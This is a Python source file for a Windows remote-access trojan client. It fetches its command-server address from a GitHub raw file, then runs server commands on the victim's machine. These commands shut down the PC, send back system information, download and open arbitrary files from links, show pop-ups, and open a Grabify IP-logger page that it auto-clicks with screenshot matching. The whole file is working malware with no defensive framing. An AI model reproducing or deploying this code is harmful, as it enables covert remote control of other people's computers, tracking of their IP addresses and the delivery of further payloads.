import os, subprocess, threading, socket, time, pickle
import pyautogui
from PIL import Image
import PIL
import win32api, cv2, shutil, datetime
from tkinter import *

# static val/change-able bef-deploy
# server = "192.168.10.63"
# port = 5050

server = None
port = None

# checks if script is in dir
file_dir = 'Window_importante_haxBy_marcuz'
if os.path.basename(os.getcwd()) != file_dir:
    curr_script = os.path.basename(sys.argv[0])
    os.mkdir(file_dir)
    shutil.move(f'{os.getcwd()}\\{curr_script}', f'{os.getcwd()}\\{file_dir}')
    os.chdir(f'{os.getcwd()}\\{file_dir}')

def msgBox(msg, title, msg_time):
    now = datetime.datetime.today()
    endtime = datetime.timedelta(seconds=float(msg_time)) + now

    root = Tk()
    root.geometry('300x300')
    root.title(title)

    Msg_lab = Label(root, text=msg)
    Msg_lab.pack()
    while now < endtime:
        now = datetime.datetime.today()

        root.update()


def cmdTalk(command):
    cmd = subprocess.Popen(f'cmd /k "{command}"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = cmd.communicate()
    return out

# gets github ip-connection-info
for t in range(10):
    if 'conn_inf.txt' not in os.listdir(os.getcwd()):
        try:
            cmdTalk('curl -o conn_inf.txt https://raw.githubusercontent.com/MarcusDev2/public_rep_marcus/main/asd%23nnsad000%5C%5C12%5C%3E%3E231%5C123%23(%265sa/conn_inf.txt')
            with open('conn_inf.txt', 'r') as file:
                data = file.read().splitlines()
                data2 = []
                for line in data:
                    data2.append(line.split('- ')[1])
                server = data2[0]
                port = int(data2[1])
                print('info uploded')
            win32api.DeleteFile(file.name)
            break
        except:
            pass

print(server, port)

static_conn = False

coder = "utf-8"
buffer = 1024

DISCONNECT_MSG = "!DISCONNECT"

svd_f = 'log.txt'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connection ast.
try:
    client.connect((server, port))
    static_conn = True
    with open(svd_f, 'wb') as file:
        pickle.dump((server, port), file)
except:
    pass

if not static_conn:
    if svd_f in os.listdir(os.getcwd()):
        with open(svd_f, 'rb') as file:
            try_server_data = pickle.load(file)
            server, port = try_server_data
        try:
            client.connect((server, port))
        except:
            server = input('server ip: ')
            port = int(input('port: '))
            client.connect((server, port))

    if svd_f not in os.listdir(os.getcwd()):
        server = input('server ip: ')
        port = int(input('port: '))
        client.connect((server, port))
        with open(svd_f, 'wb') as file:
            pickle.dump((server, port), file)


connected = True

def send(msg):
    global connected
    if msg == DISCONNECT_MSG:
        connected = False
    msg = bytes(msg, coder)
    client.send(msg)


def recv():
    global connected, server, port
    print("Listening for server cmd")
    # main loop
    while connected:
        msg = client.recv(buffer).decode(coder)
        # stops conn.
        if msg == 'kick':
            send(DISCONNECT_MSG)

        # stops/starts pc shutdown protocol
        if 'shutdown' in msg:
            if 'shutdown -a' == msg:
                cmdTalk('shutdown -a')
            else:
                indic = msg.split(" /")[1:]
                wrnMsg = ''
                if '/c' in msg:
                    wrnMsg = msg.split('/c ')[1]
                command = f'shutdown /{indic[0]} /{indic[1]} /c "{wrnMsg}"'
                cmdTalk(command)

        # open website
        if 'start' in msg:
            if 'www' in msg.split(' ')[1]:
                command = msg
            else:
                command = f'start www.{msg.split(" ")[1]}.com'
            cmdTalk(command)
        # sends client's pc-info
        if msg == 'systeminfo':
            data = cmdTalk('systeminfo')
            data = str(data).split('\\r\\n')[1:]
            for thing in data:
                output = ''
                for ch in thing:
                    if ch != ' ':
                        output += ch
                data[data.index(thing)] = output
            send(f'system info of {client.getsockname()} / {data}')

        # downloads anything (given a link)
        if 'download' in msg:
            all_files = os.listdir(os.getcwd())
            if '/' in msg:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)
                all_newfiles = os.listdir(os.getcwd())
                print(all_files, all_newfiles)
                for file in all_newfiles:
                    if file not in all_files:
                        f_name, f_ext = os.path.splitext(file)
                        f_newname = f"{msg.split(' ')[3]}{f_ext}"
                        print(f_newname)
                        os.rename(file, f'{f_newname}')
            else:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)

        # get client info with grabify (using img recog.)
        if msg == 'grabify':
            track_url = 'https://grabify.link/HR4SP9'
            cmdTalk(f'start {track_url}')
            time.sleep(3)

            img_git_download = 'https://raw.githubusercontent.com/MarcusDev2/public_rep_marcus/main/asd%23nnsad000%5C%5C12%5C%3E%3E231%5C123%23(%265sa/grb_clc.PNG'


            grabif_img = None
            grabify_img_name = 'grb_clc.png'
            max_val = 0

            if grabify_img_name not in os.listdir():
                try:
                    cmdTalk(f'curl -o {grabify_img_name} {img_git_download}')
                    grabif_img = cv2.imread(grabify_img_name)
                    send('grabify img downloaded')
                except:
                    send("git/grabify img not found, couldn't download")
            if grabify_img_name in os.listdir():
                grabif_img = cv2.imread(grabify_img_name)


            scSh_name = "screenShot.png"
            for i in range(50):
                try:
                    if grabif_img == None:
                        send('No grabify img found')
                        break
                except:
                    pass
                try:
                    print(f'{i + 1}. try')
                    pyautogui.screenshot(scSh_name)
                    scn_img = cv2.imread(scSh_name)
                    results = cv2.matchTemplate(scn_img, grabif_img, cv2.TM_CCOEFF_NORMED)
                    min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(results)
                    if max_val >= 0.92:
                        pyautogui.moveTo(max_loc)
                        pyautogui.click()
                        send('grabify succ')
                        break
                except:
                    pass
            if scSh_name in os.listdir():
                win32api.DeleteFile(scSh_name)
            if max_val < 0.92:
                send(f'grabify failed')

        # make a pop-up window with msg
        if '/alert' in msg:
            cmd = msg
            if '/t ' in cmd:
                try:
                    good = cmd.split(' /')[1:]
                    timeProt = f"t {cmd.split(' /t ')[1].split(' /')[0]}"
                    good.remove(timeProt)
                    if len(good) > 0:
                        alert_msg = good[0]
                        if len(good) > 1:
                            alert_title = good[1]
                        else:
                            alert_title = None
                    else:
                        alert_msg = None
                        alert_title = None
                    alert_t = cmd.split(' /t ')[1].split(' /')[0]
                    msgBoxThred = threading.Thread(target=msgBox, args=(alert_msg, alert_title, alert_t))
                    msgBoxThred.start()
                except:
                    send('failed to make a MessageBox')
        # gets files in main dir
        if msg == 'get files':
            send(f'{os.getcwd()} files: {os.listdir(os.getcwd())}')
        # open file
        if 'open' in msg:
            command = f'{os.getcwd()}\\{msg.split(" ")[1]}'
            cmdTalk(command)
        else:
            print(msg)


startUp_msg = """
    ______   ____    ____  _______ .______   ____    ____  __   ___________    __    ____  _______ .______      
   /  __  \  \   \  /   / |   ____||   _  \  \   \  /   / |  | |   ____\   \  /  \  /   / |   ____||   _  \     
  |  |  |  |  \   \/   /  |  |__   |  |_)  |  \   \/   /  |  | |  |__   \   \/    \/   /  |  |__   |  |_)  |    
  |  |  |  |   \      /   |   __|  |      /    \      /   |  | |   __|   \            /   |   __|  |      /     
  |  `--'  |    \    /    |  |____ |  |\  \     \    /    |  | |  |____   \    /\    /    |  |____ |  |\  \\
   \______/      \__/     |_______||__| \__\     \__/     |__| |_______|   \__/  \__/     |_______||__| \\__\\

   ############################################################################################################
                                   _____  _  _               _   
                                  / ____|| |(_)             | |  
                                 | |     | | _   ___  _ __  | |_ 
                                 | |     | || | / _ \| '_ \ | __|
                                 | |____ | || ||  __/| | | || |_ 
                                  \_____||_||_| \___||_| |_| \__|
                                                                 
                                                                 
"""
print(startUp_msg)

thred_recv = threading.Thread(target=recv)
thred_recv.start()






